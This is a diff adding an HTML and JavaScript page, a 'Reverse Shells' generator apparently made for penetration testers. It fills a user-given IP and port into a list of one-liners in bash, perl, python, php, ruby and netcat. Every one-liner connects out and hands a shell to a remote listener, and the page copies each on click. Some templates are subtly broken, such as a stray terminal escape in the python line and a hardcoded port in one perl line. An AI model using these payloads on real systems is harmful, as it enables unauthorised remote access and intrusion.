@@ -1,0 +1,173 @@
+<style>
+    #ToolReverse table {
+        margin-right: 1em;
+    }
+
+    #ToolReverse input {
+        font-family: monospace;
+    }
+
+    #ReverseOutput td {
+        padding-top: 0.20em;
+        padding-bottom: 0.20em;
+    }
+
+    #ReverseOutput td.example {
+        background-color: black;
+        color: #0BB;
+        cursor: pointer;
+    }
+
+    #ReverseOutput td.example:hover {
+        color: #0FF;
+    }
+
+    #ReverseOutput {
+        margin-top: 1em;
+        background-color: #333;
+        border-radius: 10px;
+        padding: 0.5em 0;
+    }
+</style>
+<details open id="ToolReverse">
+    <summary>Reverse Shells</summary>
+    <p>
+        <form>
+            <label>IP <input type="text" id="ReverseIP" placeholder="e.g. 127.0.0.1"/></label>
+            <label>Port <input type="text" id="ReversePort" placeholder="e.g. 1337" value="1337"/></label>
+            <button onClick="reverseGenerate()">Generate</button>
+            <div id="ReverseOutput"></div>
+            <p align="right"><small>Adapted from <a class="no-block"" href="https://github.com/spyx/monkey-shell">monkey-shell</a></small></p>
+        </form>
+    </p>
+</details>
+<script>
+    const reverseTemplates = [{
+        "software": "bash",
+        "cmd": "bash -i >& /dev/tcp/##IP##/##PORT## 0>&1"
+    }, {
+        "software": "bash",
+        "cmd": "0<&196;exec 196<>/dev/tcp/##IP##/##PORT##; sh <&196 >&196 2>&196"
+    }, {
+        "software": "bash",
+        "cmd": "exec 5<>/dev/tcp/##IP##/##PORT## | cat <&5 | while read line; do $line 2>&5 >&5; done"
+    }, {
+        "software": "perl",
+        "cmd": "perl -e 'use Socket;\$i=\"##IP##\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    }, {
+        "software": "perl",
+        "cmd": "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"##IP##:##PORT##\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
+    }, {
+        "software": "perl-win",
+        "cmd": "perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"##IP##:##PORT##\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
+    }, {
+        "software": "python",
+        "cmd": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"##IP##\",##PORT##));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]\e[0m);'"
+    }, {
+        "software": "php",
+        "cmd": "php -r '\$sock=fsockopen(\"##IP##\",##PORT##);exec(\"/bin/sh -i \<\&3 \>\&3 2\>\&3\");'"
+    }, {
+        "software": "ruby",
+        "cmd": "ruby -rsocket -e'f=TCPSocket.open(\"##IP##\",##PORT##).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    }, {
+        "software": "ruby",
+        "cmd": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"##IP##\",\"##PORT##\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    }, {
+        "software": "ruby",
+        "cmd": "ruby -rsocket -e 'c=TCPSocket.new(\"##IP##\",\"##PORT##\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    }, {
+        "software": "netcat",
+        "cmd": "nc -e /bin/sh ##IP## ##PORT##"
+    }, {
+        "software": "netcat",
+        "cmd": "nc -c /bin/sh ##IP## ##PORT##"
+    }, {
+        "software": "netcat",
+        "cmd": "/bin/sh | nc ##IP## ##PORT##"
+    }, {
+        "software": "netcat",
+        "cmd": "rm -f /tmp/p; mknod /tmp/p p && nc ##IP## ##PORT## 0/tmp/p"
+    }, {
+        "software": "netcat",
+        "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ##IP## ##PORT## >/tmp/f"
+    }, ]
+
+    function ready(fn) {
+        if (document.readyState != 'loading') {
+            fn();
+        } else {
+            document.addEventListener('DOMContentLoaded', fn);
+        }
+    }
+
+    let frmReverseIP = null;
+    let frmReversePort = null;
+    let reverseOutput = null;
+
+
+    ready(() => {
+        frmReverseIP = document.getElementById("ReverseIP");
+        frmReversePort = document.getElementById("ReversePort");
+        reverseOutput = document.getElementById("ReverseOutput");
+    });
+
+    function selectText(el, win) {
+        win = win || window;
+        var doc = win.document,
+            sel, range;
+        if (win.getSelection && doc.createRange) {
+            sel = win.getSelection();
+            range = doc.createRange();
+            range.selectNodeContents(el);
+            sel.removeAllRanges();
+            sel.addRange(range);
+        } else if (doc.body.createTextRange) {
+            range = doc.body.createTextRange();
+            range.moveToElementText(el);
+            range.select();
+        }
+    }
+
+    function onRowClick(el) {
+        if (el.className !== "example") return;
+        selectText(el);
+        document.execCommand("copy");
+    }
+
+    function reverseGenerate() {
+        // Don't do anything without inputs
+        if (frmReverseIP.value.trim().length == 0) {
+            window.setTimeout(() => {
+                frmReverseIP.focus();
+            });
+            return;
+        }
+        if (frmReversePort.value.trim().length == 0) {
+            window.setTimeout(() => {
+                frmReversePort.focus();
+            });
+            return;
+        }
+
+        // Clear out the output
+        while (reverseOutput.firstChild)
+            reverseOutput.removeChild(reverseOutput.firstChild);
+
+        let table = document.createElement("table");
+
+        for (var i in reverseTemplates) {
+            let cmd = `<td>${reverseTemplates[i].software}</td><td class="example">${reverseTemplates[i].cmd}</td>`;
+            cmd = cmd.replace("##IP##", frmReverseIP.value.trim());
+            cmd = cmd.replace("##PORT##", frmReversePort.value.trim());
+
+            let tableRow = document.createElement("tr");
+            tableRow.innerHTML = cmd;
+            tableRow.addEventListener("click", (el) => {
+                onRowClick(el.target);
+            })
+            table.appendChild(tableRow);
+        }
+
+        reverseOutput.appendChild(table);
+    }
+</script>
